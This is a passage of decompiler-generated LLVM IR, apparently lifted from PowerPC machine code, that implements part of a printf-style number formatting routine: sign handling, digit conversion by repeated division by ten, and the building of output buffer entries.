  %v4_10007ef8 = icmp eq i32 %v0_10007ef8, %v2_10007ef0
  store i1 %v2_10007ef8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007ef8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10007d84, i32* %r8.global-to-local, align 4
  br i1 %v3_10007ef8, label %dec_label_pc_10007f10, label %dec_label_pc_10007f04

dec_label_pc_10007f04:                            ; preds = %dec_label_pc_10007ef0
  store i32 %v2_10007ef0, i32* %r8.global-to-local, align 4
  %v1_10007f08 = add i32 %v0_10007ef4, 1
  store i32 %v1_10007f08, i32* @r7, align 4
  store i32 %v2_10007ef0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007f10

dec_label_pc_10007f10:                            ; preds = %dec_label_pc_10007ef0, %dec_label_pc_10007f04
  %v2_10007f18 = phi i32 [ %v0_10007ef8, %dec_label_pc_10007ef0 ], [ %v2_10007ef0, %dec_label_pc_10007f04 ]
  %v0_10007f10 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007f10 = icmp slt i32 %v0_10007f10, 103
  %v3_10007f10 = icmp eq i32 %v0_10007f10, 103
  store i1 %v1_10007f10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f10, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10007f18 = add i32 %v2_10007f18, 1
  %v4_10007f18 = inttoptr i32 %v3_10007f18 to i8*
  store i8 0, i8* %v4_10007f18, align 1
  %v0_10007f1c = load i32, i32* %r11.global-to-local, align 4
  %v1_10007f1c = add i32 %v0_10007f1c, 1
  store i32 %v1_10007f1c, i32* %r9.global-to-local, align 4
  %v0_10007f20 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007f20, label %dec_label_pc_10007f24, label %dec_label_pc_10007f48

dec_label_pc_10007f24:                            ; preds = %dec_label_pc_10007f10
  %v0_10007f24 = load i32, i32* @r7, align 4
  %v1_10007f24 = icmp slt i32 %v0_10007f24, -4
  %v3_10007f24 = icmp eq i32 %v0_10007f24, -4
  store i1 %v1_10007f24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10007f24, label %dec_label_pc_10007f40, label %dec_label_pc_10007f2c

dec_label_pc_10007f2c:                            ; preds = %dec_label_pc_10007f24
  %v1_10007f2c = load i32, i32* %r10.global-to-local, align 4
  %v2_10007f2c = icmp sgt i32 %v1_10007f2c, %v0_10007f24
  %v3_10007f2c = icmp slt i32 %v1_10007f2c, %v0_10007f24
  %v4_10007f2c = icmp eq i32 %v1_10007f2c, %v0_10007f24
  store i1 %v2_10007f2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007f2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007f2c, label %dec_label_pc_10007f40, label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007f2c
  %v2_10007f34 = sub i32 %v1_10007f2c, %v0_10007f24
  store i32 %v2_10007f34, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007f60

dec_label_pc_10007f40:                            ; preds = %dec_label_pc_10007f2c, %dec_label_pc_10007f24
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007f54

dec_label_pc_10007f48:                            ; preds = %dec_label_pc_10007f10
  %v0_10007f48 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007f48 = icmp slt i32 %v0_10007f48, 102
  %v3_10007f48 = icmp eq i32 %v0_10007f48, 102
  store i1 %v1_10007f48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f48, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10007f48, i32* %r4.global-to-local, align 4
  br i1 %v3_10007f48, label %dec_label_pc_10007f60thread-pre-split, label %dec_label_pc_10007f54

dec_label_pc_10007f54:                            ; preds = %dec_label_pc_10007f48, %dec_label_pc_10007f40
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10007f74

dec_label_pc_10007f60thread-pre-split:            ; preds = %dec_label_pc_10007f48
  %v0_10007f60.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10007f60

dec_label_pc_10007f60:                            ; preds = %dec_label_pc_10007f60thread-pre-split, %dec_label_pc_10007f34
  %v0_10007f64 = phi i32 [ %v0_10007f60.pr, %dec_label_pc_10007f60thread-pre-split ], [ %v0_10007f24, %dec_label_pc_10007f34 ]
  %v1_10007f60 = icmp slt i32 %v0_10007f64, 0
  %v2_10007f60 = icmp sgt i32 %v0_10007f64, 0
  %v3_10007f60 = icmp eq i32 %v0_10007f64, 0
  store i1 %v1_10007f60, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10007f60, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10007f60, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10007f64, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10007f64, -1
  br i1 %tmp78, label %dec_label_pc_10007f74, label %dec_label_pc_10007f6c

dec_label_pc_10007f6c:                            ; preds = %dec_label_pc_10007f60
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10007f70 = load i32, i32* %r8.global-to-local, align 4
  %v3_10007f70 = add i32 %v2_10007f70, -1
  %v4_10007f70 = inttoptr i32 %v3_10007f70 to i8*
  store i8 48, i8* %v4_10007f70, align 1
  store i32 %v3_10007f70, i32* %r8.global-to-local, align 4
  %v1_10007f90.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10007fa4.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10007f74

dec_label_pc_10007f74:                            ; preds = %dec_label_pc_10007f60, %dec_label_pc_10007f54, %dec_label_pc_10007f6c
  %v0_10007fa4 = phi i1 [ %v1_10007f60, %dec_label_pc_10007f60 ], [ false, %dec_label_pc_10007f54 ], [ %v0_10007fa4.pre, %dec_label_pc_10007f6c ]
  %v1_10007f90 = phi i32 [ %v1_10007f1c, %dec_label_pc_10007f60 ], [ %v1_10007f1c, %dec_label_pc_10007f54 ], [ %v1_10007f90.pre, %dec_label_pc_10007f6c ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10007f80 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10007f80, i32* %r0.global-to-local, align 4
  %v0_10007f88 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007f88 = add i32 %v0_10007f88, 1
  store i32 %v1_10007f88, i32* %r6.global-to-local, align 4
  %v2_10007f90 = sub i32 %v1_10007f90, %v1_10007f88
  store i32 %v2_10007f90, i32* %r11.global-to-local, align 4
  %v1_10007f94 = inttoptr i32 %v0_10007f88 to i8*
  %v2_10007f94 = load i8, i8* %v1_10007f94, align 1
  %v3_10007f94 = zext i8 %v2_10007f94 to i32
  store i32 %v3_10007f94, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10007fa4, label %dec_label_pc_10008004, label %dec_label_pc_10007fa8

dec_label_pc_10007fa8:                            ; preds = %dec_label_pc_10007f74
  %v0_10007fa8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007fa8 = icmp slt i32 %v0_10007fa8, %v2_10007f90
  %v4_10007fa8 = icmp eq i32 %v0_10007fa8, %v2_10007f90
  store i1 %v2_10007fa8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007fa8, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10007fa8, label %dec_label_pc_10007ffc, label %dec_label_pc_10007fbc

dec_label_pc_10007fbc:                            ; preds = %dec_label_pc_10007fa8
  %v2_10007fbc = sub i32 %v0_10007fa8, %v2_10007f90
  store i32 %v2_10007fbc, i32* %r0.global-to-local, align 4
  %v4_10007fbc = icmp sgt i32 %v2_10007fbc, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10007fbc, label %dec_label_pc_10007fd8, label %dec_label_pc_10007fc8

dec_label_pc_10007fc8:                            ; preds = %dec_label_pc_10007fbc
  %v2_10007fcc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10007fcc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008020

dec_label_pc_10007fd8:                            ; preds = %dec_label_pc_10007fbc
  store i32 ptrtoint (i32* @global_var_1000cf43.431 to i32), i32* %r9.global-to-local, align 4
  %v2_10007fe4 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10007fe4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10008020

dec_label_pc_10007ffc:                            ; preds = %dec_label_pc_10007fa8
  %v0_10007ffc = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10007ffc, label %dec_label_pc_1000800c, label %dec_label_pc_10008000

dec_label_pc_10008000:                            ; preds = %dec_label_pc_10007ffc
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008004

dec_label_pc_10008004:                            ; preds = %dec_label_pc_10007f74, %dec_label_pc_10008000
  %v2_10008004 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10008004, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008020

dec_label_pc_1000800c:                            ; preds = %dec_label_pc_10007ffc
  %v2_1000800c = sub i32 %v2_10007f90, %v0_10007fa8
  store i32 %v2_1000800c, i32* %r11.global-to-local, align 4
  %v2_10008014 = add i32 %v0_10007fa8, %v1_10007f88
  store i32 %v2_10008014, i32* %r6.global-to-local, align 4
  %v2_10008018 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10008018, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008020

dec_label_pc_10008020:                            ; preds = %dec_label_pc_10008004, %dec_label_pc_10007fd8, %dec_label_pc_10007fc8, %dec_label_pc_1000800c
  %v1_1000804c = phi i32 [ %v2_10008004, %dec_label_pc_10008004 ], [ %v2_10007fe4, %dec_label_pc_10007fd8 ], [ %v2_10007fcc, %dec_label_pc_10007fc8 ], [ %v2_10008018, %dec_label_pc_1000800c ]
  %v0_1000802c = phi i32 [ %v2_10007f90, %dec_label_pc_10008004 ], [ 0, %dec_label_pc_10007fd8 ], [ 0, %dec_label_pc_10007fc8 ], [ %v2_1000800c, %dec_label_pc_1000800c ]
  %v3_10008020 = load i32, i32* %v2_10007bf0, align 4
  store i32 %v3_10008020, i32* %r0.global-to-local, align 4
  %v1_10008024 = and i32 %v3_10008020, 16
  store i32 %v1_10008024, i32* %r9.global-to-local, align 4
  %v3_10008024 = icmp eq i32 %v1_10008024, 0
  br i1 %v3_10008024, label %dec_label_pc_1000802c, label %dec_label_pc_10008044

dec_label_pc_1000802c:                            ; preds = %dec_label_pc_10008020
  %v1_1000802c = icmp slt i32 %v0_1000802c, 0
  %v3_1000802c = icmp eq i32 %v0_1000802c, 0
  store i1 %v1_1000802c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000802c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000802c, label %dec_label_pc_10008034, label %dec_label_pc_10008044

dec_label_pc_10008034:                            ; preds = %dec_label_pc_1000802c
  %v0_10008034 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008034 = icmp slt i32 %v0_10008034, 103
  %v3_10008034 = icmp eq i32 %v0_10008034, 103
  store i1 %v1_10008034, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008034, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008034, label %dec_label_pc_10008064, label %dec_label_pc_1000803c

dec_label_pc_1000803c:                            ; preds = %dec_label_pc_10008034
  %v0_1000803c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000803c = icmp slt i32 %v0_1000803c, 0
  %v3_1000803c = icmp eq i32 %v0_1000803c, 0
  store i1 %v1_1000803c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000803c, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000803c, 1
  br i1 %tmp79, label %dec_label_pc_10008064, label %dec_label_pc_10008044

dec_label_pc_10008044:                            ; preds = %dec_label_pc_1000802c, %dec_label_pc_10008020, %dec_label_pc_1000803c
  %v2_1000804c = inttoptr i32 %v1_1000804c to i32*
  store i32 112, i32* %v2_1000804c, align 4
  store i32 ptrtoint (i32* @global_var_1000cf50.432 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10008058 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008058 = add i32 %v1_10008058, 8
  %v3_10008058 = inttoptr i32 %v2_10008058 to i32*
  store i32 ptrtoint (i32* @global_var_1000cf50.432 to i32), i32* %v3_10008058, align 4
  %v0_1000805c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000805c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000805c = add i32 %v1_1000805c, 4
  %v3_1000805c = inttoptr i32 %v2_1000805c to i32*
  store i32 %v0_1000805c, i32* %v3_1000805c, align 4
  %v0_10008060 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008060 = add i32 %v0_10008060, 12
  store i32 %v1_10008060, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008064

dec_label_pc_10008064:                            ; preds = %dec_label_pc_1000803c, %dec_label_pc_10008034, %dec_label_pc_10008044
  %v1_10008074 = phi i32 [ %v1_1000804c, %dec_label_pc_1000803c ], [ %v1_1000804c, %dec_label_pc_10008034 ], [ %v1_10008060, %dec_label_pc_10008044 ]
  %v0_10008064 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008064 = add i32 %v0_10008064, 1
  store i32 %v1_10008064, i32* %r10.global-to-local, align 4
  %v4_10008064 = icmp eq i32 %v1_10008064, 0
  br i1 %v4_10008064, label %dec_label_pc_1000808c, label %dec_label_pc_1000806c

dec_label_pc_1000806c:                            ; preds = %dec_label_pc_10008064
  %v1_1000806c = sub i32 -1, %v0_10008064
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10008074 = add i32 %v1_10008074, 4
  %v3_10008074 = inttoptr i32 %v2_10008074 to i32*
  store i32 %v1_1000806c, i32* %v3_10008074, align 4
  store i32 ptrtoint (i32* @global_var_1000cf43.431 to i32), i32* %r9.global-to-local, align 4
  %v0_10008080 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008080 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008080 = inttoptr i32 %v1_10008080 to i32*
  store i32 %v0_10008080, i32* %v2_10008080, align 4
  %v0_10008084 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008084 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008084 = add i32 %v1_10008084, 8
  %v3_10008084 = inttoptr i32 %v2_10008084 to i32*
  store i32 %v0_10008084, i32* %v3_10008084, align 4
  %v0_10008088 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008088 = add i32 %v0_10008088, 12
  store i32 %v1_10008088, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000808c

dec_label_pc_1000808c:                            ; preds = %dec_label_pc_10008064, %dec_label_pc_1000806c
  %v1_10008098 = phi i32 [ %v1_10008074, %dec_label_pc_10008064 ], [ %v1_10008088, %dec_label_pc_1000806c ]
  %v0_1000808c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000808c = icmp slt i32 %v0_1000808c, 0
  %v3_1000808c = icmp eq i32 %v0_1000808c, 0
  store i1 %v1_1000808c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000808c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000808c, label %dec_label_pc_100080a8, label %dec_label_pc_10008094

dec_label_pc_10008094:                            ; preds = %dec_label_pc_1000808c
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10008098 = load i32, i32* %r6.global-to-local, align 4
  %v2_10008098 = add i32 %v1_10008098, 8
  %v3_10008098 = inttoptr i32 %v2_10008098 to i32*
  store i32 %v0_10008098, i32* %v3_10008098, align 4
  %v0_1000809c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000809c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000809c = inttoptr i32 %v1_1000809c to i32*
  store i32 %v0_1000809c, i32* %v2_1000809c, align 4
  %v0_100080a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100080a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080a0 = add i32 %v1_100080a0, 4
  %v3_100080a0 = inttoptr i32 %v2_100080a0 to i32*
  store i32 %v0_100080a0, i32* %v3_100080a0, align 4
  %v0_100080a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100080a4 = add i32 %v0_100080a4, 12
  store i32 %v1_100080a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100080a8

dec_label_pc_100080a8:                            ; preds = %dec_label_pc_1000808c, %dec_label_pc_10008094
  %v1_100080d0 = phi i32 [ %v1_10008098, %dec_label_pc_1000808c ], [ %v1_100080a4, %dec_label_pc_10008094 ]
  %v0_100080a8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100080a8 = icmp slt i32 %v0_100080a8, 103
  %v3_100080a8 = icmp eq i32 %v0_100080a8, 103
  store i1 %v1_100080a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100080a8, label %dec_label_pc_100080b0, label %dec_label_pc_100080bc

dec_label_pc_100080b0:                            ; preds = %dec_label_pc_100080a8
  %v3_100080b0 = load i32, i32* %v2_10007bf0, align 4
  store i32 %v3_100080b0, i32* %r0.global-to-local, align 4
  %v1_100080b4 = and i32 %v3_100080b0, 16
  store i32 %v1_100080b4, i32* %r9.global-to-local, align 4
  %v3_100080b4 = icmp eq i32 %v1_100080b4, 0
  br i1 %v3_100080b4, label %dec_label_pc_100080e8, label %dec_label_pc_100080bc

dec_label_pc_100080bc:                            ; preds = %dec_label_pc_100080a8, %dec_label_pc_100080b0
  %v0_100080bc = load i32, i32* %r10.global-to-local, align 4
  %v1_100080bc = load i32, i32* %r11.global-to-local, align 4
  %v2_100080bc = sub i32 %v1_100080bc, %v0_100080bc
  store i32 %v2_100080bc, i32* %r9.global-to-local, align 4
  %v1_100080c0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100080c0 = icmp sgt i32 %v1_100080c0, %v2_100080bc
  %v4_100080c0 = icmp eq i32 %v1_100080c0, %v2_100080bc
  store i1 %v2_100080c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100080c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100080c0, label %dec_label_pc_100080c8, label %dec_label_pc_100080e8

dec_label_pc_100080c8:                            ; preds = %dec_label_pc_100080bc
  %v2_100080c8 = sub i32 %v1_100080c0, %v2_100080bc
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100080d0 = add i32 %v1_100080d0, 4
  %v3_100080d0 = inttoptr i32 %v2_100080d0 to i32*
  store i32 %v2_100080c8, i32* %v3_100080d0, align 4
  store i32 ptrtoint (i32* @global_var_1000cf43.431 to i32), i32* %r9.global-to-local, align 4
  %v0_100080dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100080dc = load i32, i32* %r8.global-to-local, align 4
  %v2_100080dc = inttoptr i32 %v1_100080dc to i32*
  store i32 %v0_100080dc, i32* %v2_100080dc, align 4
  %v0_100080e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100080e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080e0 = add i32 %v1_100080e0, 8
  %v3_100080e0 = inttoptr i32 %v2_100080e0 to i32*
  store i32 %v0_100080e0, i32* %v3_100080e0, align 4
  %v0_100080e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100080e4 = add i32 %v0_100080e4, 12
  store i32 %v1_100080e4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100080e8

dec_label_pc_100080e8:                            ; preds = %dec_label_pc_100080bc, %dec_label_pc_100080b0, %dec_label_pc_100080c8
  %v1_1000817c37 = phi i32 [ %v1_100080d0, %dec_label_pc_100080bc ], [ %v1_100080d0, %dec_label_pc_100080b0 ], [ %v1_100080e4, %dec_label_pc_100080c8 ]
  %v0_100080e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100080e8 = icmp slt i32 %v0_100080e8, 102
  %v3_100080e8 = icmp eq i32 %v0_100080e8, 102
  store i1 %v1_100080e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100080e8, label %dec_label_pc_10008170, label %dec_label_pc_100080f0

dec_label_pc_100080f0:                            ; preds = %dec_label_pc_100080e8
  %v0_100080f0 = load i32, i32* @r7, align 4
  %v1_100080f0 = icmp slt i32 %v0_100080f0, 0
  %v3_100080f0 = icmp eq i32 %v0_100080f0, 0
  store i1 %v1_100080f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080f0, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_100080f0, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_100080f0, -1
  br i1 %tmp80, label %dec_label_pc_1000810c, label %dec_label_pc_10008104

dec_label_pc_10008104:                            ; preds = %dec_label_pc_100080f0
  %v1_10008104 = sub i32 0, %v0_100080f0
  store i32 %v1_10008104, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000810c

dec_label_pc_1000810c:                            ; preds = %dec_label_pc_100080f0, %dec_label_pc_10008104
  %v0_1000812031 = phi i32 [ %v0_100080f0, %dec_label_pc_100080f0 ], [ %v1_10008104, %dec_label_pc_10008104 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10008110 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10008110, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008120

dec_label_pc_10008120:                            ; preds = %dec_label_pc_10008120.backedge, %dec_label_pc_1000810c
  %v2_10008140 = phi i32 [ %v3_10008140, %dec_label_pc_10008120.backedge ], [ %v2_10008110, %dec_label_pc_1000810c ]
  %v0_10008124 = phi i32 [ %v0_10008124.pre, %dec_label_pc_10008120.backedge ], [ 2, %dec_label_pc_1000810c ]
  %v1_10008120 = phi i32 [ %v1_10008120.pre, %dec_label_pc_10008120.backedge ], [ 10, %dec_label_pc_1000810c ]
  %v1_10008134 = phi i32 [ %v0_10008120.pre, %dec_label_pc_10008120.backedge ], [ %v0_1000812031, %dec_label_pc_1000810c ]
  %v2_10008120 = sdiv i32 %v1_10008134, %v1_10008120
  store i32 %v2_10008120, i32* %r0.global-to-local, align 4
  %v1_10008124 = add i32 %v0_10008124, 1
  store i32 %v1_10008124, i32* @r7, align 4
  %v1_10008128 = icmp slt i32 %v1_10008124, 3
  %v3_10008128 = icmp eq i32 %v1_10008124, 3
  store i1 %v1_10008128, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008128, i1* %cr7_eq.global-to-local, align 1
  %v1_10008130 = icmp slt i32 %v2_10008120, 0
  %v2_10008130 = icmp sgt i32 %v2_10008120, 0
  %v3_10008130 = icmp eq i32 %v2_10008120, 0
  store i1 %v1_10008130, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10008130, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10008130, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10008120, -10
  store i32 %v2_10008120, i32* %r11.global-to-local, align 4
  %v2_10008134 = add i32 %v1_10008134, 48
  %v1_1000813c = add i32 %v2_10008134, %tmp81
  store i32 %v1_1000813c, i32* %r9.global-to-local, align 4
  %v1_10008140 = trunc i32 %v1_1000813c to i8
  %v3_10008140 = add i32 %v2_10008140, -1
  %v4_10008140 = inttoptr i32 %v3_10008140 to i8*
  store i8 %v1_10008140, i8* %v4_10008140, align 1
  store i32 %v3_10008140, i32* %r10.global-to-local, align 4
  %v0_10008144 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10008144 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10008144 = or i1 %v0_10008144, %v1_10008144
  br i1 %v2_10008144, label %dec_label_pc_10008120.backedge, label %dec_label_pc_10008148

dec_label_pc_10008120.backedge:                   ; preds = %dec_label_pc_10008120, %dec_label_pc_10008148
  %v0_10008120.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10008120.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10008124.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10008120

dec_label_pc_10008148:                            ; preds = %dec_label_pc_10008120
  %v0_10008148 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10008148, label %dec_label_pc_1000814c, label %dec_label_pc_10008120.backedge

dec_label_pc_1000814c:                            ; preds = %dec_label_pc_10008148
  %v1_1000814c = add i32 %v2_10008140, -2
  store i32 %v1_1000814c, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10008154 = add i32 %v2_10008140, -3
  store i32 %v1_10008154, i32* %r11.global-to-local, align 4
  %v0_10008158 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008158 = trunc i32 %v0_10008158 to i8
  %v4_10008158 = inttoptr i32 %v1_1000814c to i8*
  store i8 %v1_10008158, i8* %v4_10008158, align 1
  %v0_1000815c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000815c = trunc i32 %v0_1000815c to i8
  %v2_1000815c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000815c = add i32 %v2_1000815c, -1
  %v4_1000815c = inttoptr i32 %v3_1000815c to i8*
  store i8 %v1_1000815c, i8* %v4_1000815c, align 1
  %v0_10008160 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008160 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008160 = inttoptr i32 %v1_10008160 to i32*
  store i32 %v0_10008160, i32* %v2_10008160, align 4
  %v0_10008164 = load i32, i32* @r7, align 4
  %v1_10008164 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008164 = add i32 %v1_10008164, 4
  %v3_10008164 = inttoptr i32 %v2_10008164 to i32*
  store i32 %v0_10008164, i32* %v3_10008164, align 4
  %v0_10008168 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008168 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008168 = add i32 %v1_10008168, 8
  %v3_10008168 = inttoptr i32 %v2_10008168 to i32*
  store i32 %v0_10008168, i32* %v3_10008168, align 4
  %v0_1000816c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000816c = add i32 %v0_1000816c, 12
  store i32 %v1_1000816c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008170

dec_label_pc_10008170:                            ; preds = %dec_label_pc_100080e8, %dec_label_pc_10007cc4, %dec_label_pc_1000814c
  %v0_100081ec = phi i32 [ %v1_1000817c37, %dec_label_pc_100080e8 ], [ %v2_10007cd0, %dec_label_pc_10007cc4 ], [ %v1_1000816c, %dec_label_pc_1000814c ]
  %v2_10008170 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10008170, i32* %r9.global-to-local, align 4
  %v1_10008180.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10008174

dec_label_pc_10008174:                            ; preds = %dec_label_pc_10008174, %dec_label_pc_10008170
  %v1_10008180 = phi i32 [ %v2_10008180, %dec_label_pc_10008174 ], [ %v1_10008180.pre, %dec_label_pc_10008170 ]
  %v0_10008174 = phi i32 [ %v1_10008178, %dec_label_pc_10008174 ], [ %v2_10008170, %dec_label_pc_10008170 ]
  %v1_10008174 = inttoptr i32 %v0_10008174 to i32*
  %v2_10008174 = load i32, i32* %v1_10008174, align 4
  store i32 %v2_10008174, i32* %r0.global-to-local, align 4
  %v1_10008178 = add i32 %v0_10008174, 12
  store i32 %v1_10008178, i32* %r9.global-to-local, align 4
  %v2_1000817c = icmp ult i32 %v1_10008178, %v0_100081ec
  %v2_10008180 = sub i32 %v1_10008180, %v2_10008174
  store i32 %v2_10008180, i32* @r28, align 4
  br i1 %v2_1000817c, label %dec_label_pc_10008174, label %dec_label_pc_10008188

dec_label_pc_10008188:                            ; preds = %dec_label_pc_10008174
  %v4_1000817c = icmp eq i32 %v1_10008178, %v0_100081ec
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000817c, i1* %cr7_eq.global-to-local, align 1
  %v3_10008188 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_100081ec, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10008188, 0
  %v1_1000819c = zext i1 %tmp85 to i32
  store i32 %v1_1000819c, i32* %r9.global-to-local, align 4
  %v2_100081a0 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100081a0, i32* %r0.global-to-local, align 4
  %v2_100081a4 = sub i32 %v2_10008180, %v1_1000819c
  store i32 %v2_100081a4, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_100081a4, 1
